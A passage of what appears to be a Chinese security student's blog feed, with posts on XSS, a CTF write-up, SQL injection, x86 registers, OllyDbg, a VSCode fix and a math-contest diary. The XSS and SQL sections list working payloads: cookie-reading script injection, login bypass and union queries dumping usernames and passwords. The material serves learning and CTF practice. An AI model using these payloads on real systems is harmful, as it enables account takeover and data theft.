mode=display">M_2=\frac{2a^3bC^2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}</script><p>Python代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relate_message_attack</span>(<span class="params">a,b,c1,c2,n</span>):</span></span><br><span class="line">    b3=gmpy2.powmod(b,<span class="number">3</span>,n)</span><br><span class="line">    part1=b*(c1+<span class="number">2</span>*c2-b3)%n</span><br><span class="line">    part2=a*(c1-c2+<span class="number">2</span>*b3)%n</span><br><span class="line">    part2=gmpy2.invert(part2,n)</span><br><span class="line">    <span class="keyword">return</span> part1*part2%n</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2020/11/03/xss%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/11/03/xss%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>XSS根源就是没完全过滤客户端提交的数据,客户端提交的数据本来是应用需要的，但恶意攻击者可能在提交的数据中插入一些符号以及javascript代码，使得这些数据成为应用代码的一部分。</p><p>sql注入拼接的是操作数据库的sql语句。xss拼接的是网页的html代码。拼接合适的html代码去执行恶意的js语句。</p><p>例如原有一个textbox的代码为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value1from&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果用户输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span></span></span><br></pre></td></tr></table></figure><p>则执行代码变为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span> &quot;&gt;</span></span><br></pre></td></tr></table></figure><p>如果用户输入<code>&quot;onfocus=&quot;alert(document.cookie)</code>代码所触发的事件也会有改变也会被改变。所以XSS攻击的威力取决于用户输入什么样的脚本。</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>提交数据 实现xss 但只对这次访问产生影响，并持久性攻击。</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>提交数据 实现xss 并且存进了数据库，别人访问这个页面就会自动触发</p><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。从效果上来说 它也是反射型XSS。</p><h4 id="如何检测是否存在XSS"><a href="#如何检测是否存在XSS" class="headerlink" title="如何检测是否存在XSS"></a>如何检测是否存在XSS</h4><p>发送语句给服务器，如果服务器没有进行过滤，服务器则会返回给客户端，则服务器存在XSS漏洞。判断XSS漏洞即主要看服务其端给客户端的响应。</p><p>常见的发送位置：留言板、评论、搜索</p><h4 id="XSS检测总结"><a href="#XSS检测总结" class="headerlink" title="XSS检测总结"></a>XSS检测总结</h4><h5 id="常用XSS检测"><a href="#常用XSS检测" class="headerlink" title="常用XSS检测"></a>常用XSS检测</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>各种绕过参考链接。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/applelife/p/10477583.html#_label8">https://www.cnblogs.com/applelife/p/10477583.html#_label8</a></p><p><a href="https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3">https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3</a></p><p><a href="https://blog.csdn.net/qw_xingzhe/article/details/80712840">https://blog.csdn.net/qw_xingzhe/article/details/80712840</a></p><p><a href="https://www.cnblogs.com/ricardojxu/p/12856312.html">https://www.cnblogs.com/ricardojxu/p/12856312.html</a></p><p><a href="https://www.jb51.net/article/90536.htm">https://www.jb51.net/article/90536.htm</a></p><h4 id="XSS题型训练平台"><a href="#XSS题型训练平台" class="headerlink" title="XSS题型训练平台"></a>XSS题型训练平台</h4><p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p><h4 id="例题：-BJDCTF-2nd-xss之光"><a href="#例题：-BJDCTF-2nd-xss之光" class="headerlink" title="例题：[BJDCTF 2nd]xss之光"></a>例题：[BJDCTF 2nd]xss之光</h4><h5 id="判断是否存在git泄露"><a href="#判断是否存在git泄露" class="headerlink" title="判断是否存在git泄露"></a>判断是否存在git泄露</h5><p>1.构造URL<code>/.git/config</code>  存在可下载文件 发现存在git泄露</p><p>2.使用 <strong>dirsearch、御剑</strong>等工具扫描后台</p><p>发现存在git泄露</p><h5 id="通过Githack获取泄露的源代码"><a href="#通过Githack获取泄露的源代码" class="headerlink" title="通过Githack获取泄露的源代码"></a>通过Githack获取泄露的源代码</h5><p>通过<code>python Githack.py &lt;url&gt;/.git/</code>命令获取到<code>index.php</code>文件 需要<strong>python2版本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>仅看到是一个反序列化，但是不知道类，则可以用php的内置类进行反序列化构造，可以用Error类或者Expection类来进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果后构造url访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?yds_is_so_beautiful=&lt;结果&gt;</span></span><br></pre></td></tr></table></figure><p>发现flag存在于cooike中</p><p>也可以通过bp传入反序列化后的结果得到flag</p><h5 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h5><h5 id="https-blog-csdn-net-qq-45521281-article-details-105812056"><a href="#https-blog-csdn-net-qq-45521281-article-details-105812056" class="headerlink" title="https://blog.csdn.net/qq_45521281/article/details/105812056"></a><a href="https://blog.csdn.net/qq_45521281/article/details/105812056">https://blog.csdn.net/qq_45521281/article/details/105812056</a></h5>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IA-32寄存器</title>
      <link href="/2020/10/22/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/"/>
      <url>/2020/10/22/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>General Purpose Registers，32位，8个</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>名称</th><th>访问低16位</th><th>访问低16位的8位</th><th>访问低16位的高8位</th></tr></thead><tbody><tr><td>EAX</td><td>(针对操作数和结果数据的)累加器</td><td>AX</td><td>AH</td><td>AL</td></tr><tr><td>EBX</td><td>(DS段中的数据指针)基址寄存器</td><td>BX</td><td>BH</td><td>BL</td></tr><tr><td>ECX</td><td>(字符串和循环操作的)计数器</td><td>CX</td><td>CH</td><td>CL</td></tr><tr><td>EDX</td><td>(I/O指针)数据寄存器</td><td>DX</td><td>DH</td><td>DL</td></tr></tbody></table></div><p>以上寄存器常用于算术运算(ADD,SUB,XOR,OR等)</p><p>ECX用于循环计数 每执行一次循环 ECX减一</p><p>EAX一般用于函数返回值</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>名称</th><th>访问低16位</th></tr></thead><tbody><tr><td>EBP</td><td>(SS段中栈内数据指针)扩展基址指针寄存器</td><td>BP</td></tr><tr><td>ESI</td><td>(字符串操作源指针)源变址寄存器</td><td>SI</td></tr><tr><td>EDI</td><td>(字符串操作目标指针)目的变址寄存器</td><td>DI</td></tr><tr><td>ESP</td><td>(SS段中栈指针)栈指针寄存器</td><td>SP</td></tr></tbody></table></div><p>ESP指示栈顶地址 某些指令(PUSH POP CALL RET)可以直接用来操作ESP</p><p>EBP表示栈区域的基地址，函数被调用时保存ESP的值，函数返回时在把值返回给ESP，保证栈不会奔溃。</p><p>ESI和EDI与特定指令(LODS STOS REP MOVS等)一起使用，主要用于内存复制。 </p><h4 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h4><p>段(Segment):内存保护技术 将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等，以保护内存。除此之外，它还同分页技术(Paging)一起用于将虚拟内存变更为实际物理内存。段内存记录在SDT(Segment Descriptor Table,段描述符表)中，而段寄存器就持有这些SDT的索引(index)。</p><p>每个段寄存器的大小为16位，即2个字节</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>CS</td><td>Code Segment,代码段寄存器</td><td>存放应用程序代码所在段的段基址</td></tr><tr><td>SS</td><td>Stack Segment,栈段寄存器</td><td>存放栈段的段基址</td></tr><tr><td>DS</td><td>Data Segment,数据段寄存器</td><td>存放数据段的段基址</td></tr><tr><td>ES</td><td>Extra(Data) Segment,附加(数据)段寄存器</td><td>存放程序使用的附加数据段的段基址</td></tr><tr><td>FS</td><td>Data Segment,数据段寄存器</td><td>存放程序使用的附加数据段的段基址</td></tr><tr><td>GS</td><td>Data Segment,数据段寄存器</td><td>存放程序使用的附加数据段的段基址</td></tr></tbody></table></div><p>FS寄存器用于计算SEH(Structured Exception Handler,结构化异常处理机制)、TEB(Thread Environment Block,线程环境块)、PEB(Process Environment Block，进程环境块)等地址。</p><h4 id="程序状态与控制寄存器"><a href="#程序状态与控制寄存器" class="headerlink" title="程序状态与控制寄存器"></a>程序状态与控制寄存器</h4><p>EFLAGS：Flag Register,标志寄存器 32位(4个字节) 由原16位FLAGS寄存器扩展而来。</p><p>32个位元每个位都有意义，每位的值为0或1代表On/Off或True/False。</p><p><strong>几个重要的标志：</strong></p><p>ZF(Zero Flag,零标志 第6位) 若运算结果为0，则其值为1(True)，否则为0(False)</p><p>OF(Overflow Flag,溢出标志 第11位) 有符号整数(signed integer)溢出时,OF值被置为1。此外，MSB(Most Signigicant Bit,最高有效位)改变时，其值也被设为1.</p><p>CF(Carry Flag,进位标志 第0位) 无符号整数(unsigned integer)溢出时,其值也被置为1</p><h4 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h4><p>EIP:Instruction Pointer,指令指针寄存器 32位(4个字节) 由原16位寄存器IP扩展而来。</p><p>EIP保存着CPU要执行的指令地址。程序运行时，CPU会读取EIP中一条指令的地址，传送指令到指令缓冲区后，EIP寄存器的值自动增加，增加的大小即是读取指令的字节大小。这样，CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。</p><p>不同直接修改EIP的值，但可以通过JMP,Jcc,CALL,RET等指令间接修改。</p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习</title>
      <link href="/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/10/19/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>在数据库中存在一个系统库：<code>information_schema</code></p><p>在它里面有个存着所有库名的表：<code>schemata</code><br>字段 <code>schema_name</code> ：库名</p><p>在它里面有个存着所有表名的表：<code>tables</code><br>字段<code>table_schema</code> ：表属于的库<br>字段<code>table_name</code> 表名</p><p>在它里面有个存着所有字段名的表：<code>columns</code><br>字段 <code>table_schema</code> ：表属于的库<br>字段 <code>table_name</code> 表名<br>字段 <code>column_name</code> 字段名</p><h4 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h4><p><code>select * from</code> 表：从表里查询所有内容</p><p><code>where</code>：有条件的从表里选取数据</p><p><code>and</code>或<code>or</code>：选取数据时存在多个条件</p><p><code>order by</code>：根据指定的结果集/指定的列进行排序</p><p><code>limit 0,1</code>：从第一行起显示一条记录</p><p><code>union select</code> ：将多个表拼在一起 <code>select * from union select * from info</code> 最后输出两张表</p><p>获取当前数据库的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><h4 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h4><p>1.布尔盲注 根据注入信息返回<code>ture</code>或<code>false</code></p><p><code>length()</code>函数 返回字符串长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and length(database()&gt;1)</span><br></pre></td></tr></table></figure><p><code>substr()</code>截取字符串，从第一位截取一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and substr(database(),1,1)&#x3D;&#39;k&#39;</span><br></pre></td></tr></table></figure><p><code>ord()/ascii()</code>返回字符的<code>ascii</code>码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and ord(substr(database(),1,1))&#x3D;107</span><br></pre></td></tr></table></figure><p>2.时间盲注 只会返回<code>true</code>通过加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确</p><p><code>sleep()</code>函数 将程序挂起一段时间n为n秒</p><p><code>if(expr1,expr2,expr3)</code>判断语句，如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,0,sleep(5))-- +</span><br></pre></td></tr></table></figure><h4 id="Eg"><a href="#Eg" class="headerlink" title="Eg.:"></a>Eg.:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//登录部分php代码</span></span><br><span class="line">select username,password，nickname <span class="keyword">from</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>于是可以构造<code>$username=&#39;admin&#39;#&#39; and password=&#39;&#123;$Any&#125;</code>实现登录即传入<code>username</code>参数为<code>admin&#39;#</code>  其中引号实现对之前的引号的闭合作用，而<code>#</code>则可以注释掉掉后面的部门，即不必进行<code>password</code>的判断 因此传入任意password实现登录</p><p>而要实现对<code>password</code>的爆破,则可以构造username为<code>1&#39; union select 1,2,($&#123;&#125;)#</code>,前面的<code>1‘</code>即实现登录而后面则是查找操作，注意选择一个数据库中不存在的<code>username</code>,比如<code>1</code>已存在 则采用<code>65537’</code> <code>union</code>后面为要查找的内容 观察php代码我们发现要传入三个字段因此传入<code>1,2</code>起占位符的作用，而后面则为要查找的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\\查库名</span><br><span class="line">   \\仅查找一项</span><br><span class="line">   1&#x27; union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">   \\采用<span class="keyword">group_concat</span>实现多项查找</span><br><span class="line">   <span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>,schema_name,<span class="string">&#x27;\&#x27;&#x27;) from information_schema.schemata limit 1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, table_name, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">&#x27;user_center&#x27;</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">\\查字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1, 2, (select group_concat(&#x27;</span>\<span class="string">&#x27;&#x27;</span>, column_name, <span class="string">&#x27;\&#x27;&#x27;) from information_schema.columns where table_schema = &#x27;</span>user_center<span class="string">&#x27; and table_name = &#x27;</span><span class="keyword">user</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\查username与password</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">&#x27;\&#x27;&#x27;, username, &#x27;</span>\<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;, password, &#x27;</span>\<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> <span class="keyword">user</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OD基础操作</title>
      <link href="/2020/10/11/OD%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/10/11/OD%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h4 id="OD基本指令"><a href="#OD基本指令" class="headerlink" title="OD基本指令"></a>OD基本指令</h4><div class="table-container"><table><thead><tr><th>指令</th><th>快捷键</th><th>含义</th></tr></thead><tbody><tr><td>Restart</td><td>Ctrl+F2</td><td>重新开始调试</td></tr><tr><td>Step Into</td><td>F7</td><td>执行一行OP code，若遇CALL 将进入函数代码内部</td></tr><tr><td>Step over</td><td>F8</td><td>执行一行OP code，若遇CALL尽执行函数自身，不跟随</td></tr><tr><td>Execute till Return</td><td>Ctrl+F9</td><td>一直在函数代码内部运行，直到遇到RETN，跳出函数</td></tr><tr><td>Go to</td><td>Ctrl+G</td><td>移动到指定地址(运行时不可用)</td></tr><tr><td>Execute till Cursor</td><td>F4</td><td>执行到光标位置，即直接转到要调试的地址</td></tr><tr><td>Comment</td><td>;</td><td>添加注释</td></tr><tr><td>Label</td><td>:</td><td>添加标签</td></tr><tr><td>Set/Reset BreakPoint</td><td>F2</td><td>设置/取消断点</td></tr><tr><td>Run</td><td>F9</td><td>运行(若设置了端点，则执行至断点处)</td></tr><tr><td>Show the current EIP</td><td>*</td><td>显示当前EIP位置</td></tr><tr><td>Show the previous Cursor</td><td>-</td><td>显示上一个光标的位置</td></tr><tr><td>Preview CALL/JMP address</td><td>Enter</td><td>若光标处有CALL/JMP指令，则跟踪并显示相关地址(运行时不可用)</td></tr><tr><td>Edit data</td><td>Ctrl+E</td><td>编辑数据</td></tr><tr><td>Assemble</td><td>Space</td><td>编写汇编代码</td></tr></tbody></table></div><h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><div class="table-container"><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>CALL xxx</td><td>调用xxx处的函数</td></tr><tr><td>JMP xxx</td><td>调整至xxx地址处</td></tr><tr><td>PUSH xxx</td><td>保持xxx到栈</td></tr><tr><td>RETN</td><td>跳转到栈中保持的地址</td></tr></tbody></table></div><h4 id="快速查找指定代码"><a href="#快速查找指定代码" class="headerlink" title="快速查找指定代码"></a>快速查找指定代码</h4><p>1.代码执行法</p><p>2.字符串检索法</p><p>3.API检索法(1):在调用代码中设断点</p><p>4.API检索法(2):在API代码中设断点</p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>The terminal has no output when I edit python with vscode</title>
      <link href="/2020/09/15/problem/"/>
      <url>/2020/09/15/problem/</url>
      
        <content type="html"><![CDATA[<p>Today I use vs to write python as usual.</p><p>But I had a serious problem .I couldn’t see any output in the vscode terminal.</p><p><img src="/2020/09/15/problem/1.png" alt></p><p>I try to modify the <strong>settings.json</strong> ，like others on the Internet.</p><p><img src="/2020/09/15/problem/2.png" alt></p><p>But it still doesn’t work.</p><p>Finally I found that <strong>python -u xxx.py</strong> can save my problem.</p><p><img src="/2020/09/15/problem/3.png" alt></p><p>This problem may be caused by buffer.</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记我的第一次国赛</title>
      <link href="/2020/09/14/%E8%AE%B0%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%BD%E8%B5%9B/"/>
      <url>/2020/09/14/%E8%AE%B0%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%BD%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>昨天晚上上传了论文，今天有空就来写点东西，总结一下这次的国赛。</p><h4 id="赛前准备"><a href="#赛前准备" class="headerlink" title="赛前准备"></a>赛前准备</h4><p>在比赛之前准备好了Latex的论文模板，整理了Latex的一些常用操作，整个写论文流程还是比较流畅的。</p><h4 id="9月10日"><a href="#9月10日" class="headerlink" title="9月10日"></a>9月10日</h4><p>晚上6点可能系统太过拥堵，题目下不下来，6点半多多拿到题目。</p><p>A题炉温曲线，感觉应该可以做，热传导函数 偏微分方程方面，侧重于数学物理计算。</p><p>B题穿越沙漠，有点像大富翁、看完题目直接放弃，这道题应该是算法、运筹学、图论方面的，我们队这方面的编程不太行，这种题没算对答案应该就没了。</p><p>C题信贷分析，数据分析题，不管咋样做这题最后搞个结果出来应该不难，信贷投资的论文还是比较好找的。</p><p>然后开始找A题的资料，但是仔细研究A题后我们就放弃了，找的论文太多东西看不懂了，初步计算了一下第一题感觉整个过程会非常复杂。</p><p>最后选了C，初步感觉可以套下之前写过的 mathorcup A题的决策树代码。</p><p>选完题目后然后就出去散步了……</p><h4 id="9月11日"><a href="#9月11日" class="headerlink" title="9月11日"></a>9月11日</h4><p>到中午之前都在混，除了确定了C题，没有做什么实质性的工作，找到一些论文也没有什么意义。下午感觉情况不太对了，开始做题。时间过半任务过半，但晚上6点前是写不完第一题了，原定晚上9点写完第一问，结果最后熬到2点写完。在真正写的过程中，未考虑到的情况太多了，很多原定10分钟解决的问题会出现各种各样不可预知的bug。</p><p>第一问的数据很多没用，先分析出有用的数据，如公司作废发票占比，税率等。后来论文写完又分析了很多的因素，不过当时的时间已经不能进行这样的大改了、之后要量化分析，那就用因子分析找预处理后数据的公因子进行打分，评级。给定信贷策略，开始想的是对分数的高低进行等比例投资，但这样就太简单了，后来是用正态分布来做的</p><h4 id="9月12日"><a href="#9月12日" class="headerlink" title="9月12日"></a>9月12日</h4><p>早上吃了早饭就开始第二题，有了第一题的思路，第二题基本一样，想着晚上应该能初步写完这三道题的模型建立，不过又没做完，晚上就只把第二题写完了，第三题写了一部分，后面的思路在写的过程中发现很有问题，就得重来，于是晚上就在看论文找思路。</p><p>第二问的数据没有信誉评级就创造信誉评级，用决策树来学习问题一的123家公司的预处理后数据，再得出问题二的数据。不过结果实在不理想，毕竟数据量太少了，于是我们就想定个合理误差范围，即上下波动一个信誉评级为合理，这样整个拟合结果就好多了。对于少量数据贝叶斯或者SVM效果会好一点，但是这方面不太会。说明完我们信誉评级的准确性，再按第一题的方法继续做一遍就处理好了。</p><p>贴个决策树的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">import</span> pydotplus</span><br><span class="line"></span><br><span class="line">input_file_path = <span class="string">&#x27;..\\123家企业的数据.csv&#x27;</span></span><br><span class="line">test_file_path = <span class="string">&#x27;..\\302家企业的数据.csv&#x27;</span></span><br><span class="line"></span><br><span class="line">data = pd.read_csv(input_file_path,encoding=<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line">test_data = pd.read_csv(test_file_path,encoding=<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"></span><br><span 